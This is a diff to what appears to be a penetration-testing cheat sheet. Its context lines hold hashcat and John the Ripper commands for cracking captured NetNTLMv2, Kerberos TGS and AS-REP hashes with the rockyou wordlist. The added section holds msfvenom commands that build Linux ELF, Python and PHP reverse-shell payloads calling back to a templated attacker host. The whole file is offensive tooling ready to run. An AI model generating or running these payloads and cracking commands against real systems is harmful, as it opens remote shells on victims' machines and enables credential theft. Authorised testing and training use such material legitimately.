@@ -55,3 +55,11 @@ hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+# === MSFVENOM PAYLOADS ===
+# Linux reverse shell - ELF binary
+msfvenom -p linux/x64/shell_reverse_tcp LHOST={{KALI}} LPORT={{KALI_REV_PORT}} -f elf -o shell.elf
+# Linux reverse shell - Python
+msfvenom -p cmd/unix/reverse_python LHOST={{KALI}} LPORT={{KALI_REV_PORT}} -f raw -o shell.py
+# PHP reverse shell (web targets)
+msfvenom -p php/reverse_php LHOST={{KALI}} LPORT={{KALI_REV_PORT}} -f raw -o shell.php
